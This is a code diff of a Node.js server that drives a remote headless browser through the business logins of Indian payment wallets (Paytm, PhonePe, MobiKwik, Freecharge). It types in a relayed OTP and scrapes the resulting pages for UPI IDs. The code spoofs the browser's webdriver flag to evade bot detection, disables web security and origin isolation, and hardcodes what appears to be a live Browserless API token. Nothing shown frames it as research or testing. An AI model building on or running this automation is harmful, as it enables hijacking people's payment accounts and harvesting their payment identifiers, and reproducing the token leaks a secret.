@@ -58,9 +58,9 @@ app.post('/api/wallet/send-otp', async (req, res) => {
 
         console.log(`\n[+] New Login Request -> Phone: ${phone} | Wallet: ${walletName.toUpperCase()}`);
         
-        // 🔴 BROWSERLESS.IO SUPERCOMPUTER CONNECTED HERE 🔴
+        // 🔴 BROWSERLESS.IO CONNECTED (WITH 3-MINUTE TIMEOUT FIX) 🔴
         browser = await puppeteer.connect({ 
-            browserWSEndpoint: 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&--disable-web-security=true&--disable-features=IsolateOrigins,site-per-process',
+            browserWSEndpoint: 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&timeout=180000&keepalive=180000&--disable-web-security=true&--disable-features=IsolateOrigins,site-per-process',
             defaultViewport: { width: 1920, height: 1080 }
         });
         
@@ -71,7 +71,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             Object.defineProperty(navigator, 'webdriver', { get: () => false }); 
         });
 
-        // 🔴 HEAVY RAM SAVER: CSS, Fonts aur Images block taaki site fat-fat khule
+        // 🔴 HEAVY RAM SAVER
         await page.setRequestInterception(true);
         page.on('request', (req) => {
             const type = req.resourceType();
@@ -86,7 +86,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
         if (walletName === 'paytm' || walletName === 'paytm business') {
             console.log("[+] Opening Paytm Business login page...");
             try {
-                await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 35000 });
+                await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 45000 });
             } catch (e) {
                 return res.status(400).json({ success: false, message: "Paytm server slow or blocked. Try again." });
             }
@@ -154,7 +154,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
         else if (walletName.includes('freecharge')) {
             console.log("[+] Opening Freecharge homepage...");
             try {
-                await page.goto('https://www.freecharge.in/', { waitUntil: 'networkidle2', timeout: 35000 });
+                await page.goto('https://www.freecharge.in/', { waitUntil: 'networkidle2', timeout: 45000 });
             } catch (e) {
                 return res.status(400).json({ success: false, message: "Freecharge server slow. Try again." });
             }
@@ -228,7 +228,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
         else if (walletName.includes('mobikwik')) {
             console.log("[+] Opening MobiKwik Homepage...");
             try {
-                await page.goto('https://www.mobikwik.com/', { waitUntil: 'domcontentloaded', timeout: 35000 });
+                await page.goto('https://www.mobikwik.com/', { waitUntil: 'domcontentloaded', timeout: 45000 });
             } catch (e) {
                 return res.status(400).json({ success: false, message: "MobiKwik server slow. Try again." });
             }
@@ -284,7 +284,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
         else if (walletName.includes('phonepe')) {
             console.log("[+] Opening PhonePe Business login page...");
             try {
-                await page.goto('https://business.phonepe.com/login', { waitUntil: 'domcontentloaded', timeout: 35000 });
+                await page.goto('https://business.phonepe.com/login', { waitUntil: 'domcontentloaded', timeout: 45000 });
             } catch (e) {
                 return res.status(400).json({ success: false, message: "PhonePe server slow. Try again." });
             }
@@ -350,12 +350,18 @@ app.post('/api/wallet/send-otp', async (req, res) => {
 // ============================================================================
 app.post('/api/wallet/verify-otp', async (req, res) => {
     const { otp } = req.body;
-    if (!page) return res.status(400).json({ success: false, message: "Browser session not active." });
+    if (!page) return res.status(400).json({ success: false, message: "Browser session not active. Request OTP again." });
 
     try {
         console.log(`[+] Injecting OTP: ${otp}`);
         
-        let frames = [page, ...page.frames()];
+        let frames;
+        try {
+            frames = [page, ...page.frames()];
+        } catch(e) {
+            frames = [page];
+        }
+
         let otpTyped = false;
         let interceptedUpi = "";
         let isOtpApiFailed = false;
@@ -411,11 +417,11 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
         }
 
         if (!otpTyped) {
-            await page.keyboard.type(otp, { delay: 60 });
+            try { await page.keyboard.type(otp, { delay: 60 }); } catch(e){}
         }
 
         await new Promise(r => setTimeout(r, 500));
-        await page.keyboard.press('Enter');
+        try { await page.keyboard.press('Enter'); } catch(e){}
 
         console.log("[+] Awaiting API verification (4 seconds)...");
         await new Promise(r => setTimeout(r, 4000)); 
@@ -450,18 +456,24 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
 
             console.log("[+] Deep Scanning HTML Source for UPI ID...");
 
+            // 🔴 DETACHED FRAME FIX: Wrapped in try-catch to prevent crashing during redirect
             for (let i = 0; i < 15; i++) {
                 if (interceptedUpi) { finalUpi = interceptedUpi; break; }
-                finalUpi = await page.evaluate(() => {
-                    try {
-                        if (!document || !document.documentElement) return "";
-                        const htmlContent = document.documentElement.innerHTML || document.body.innerHTML || "";
-                        const regex = /[a-zA-Z0-9.\-_]{3,}@(paytm|paytmpty|pty|paytmqr)/i;
-                        const match = htmlContent.match(regex);
-                        if (match) return match[0];
-                        return "";
-                    } catch (e) { return ""; }
-                });
+                try {
+                    finalUpi = await page.evaluate(() => {
+                        try {
+                            if (!document || !document.documentElement) return "";
+                            const htmlContent = document.documentElement.innerHTML || document.body.innerHTML || "";
+                            const regex = /[a-zA-Z0-9.\-_]{3,}@(paytm|paytmpty|pty|paytmqr)/i;
+                            const match = htmlContent.match(regex);
+                            if (match) return match[0];
+                            return "";
+                        } catch (e) { return ""; }
+                    });
+                } catch(evalErr) {
+                    console.log("[!] Page navigating, waiting for frame...");
+                }
+                
                 if (finalUpi) break;
                 await new Promise(r => setTimeout(r, 1000));
             }
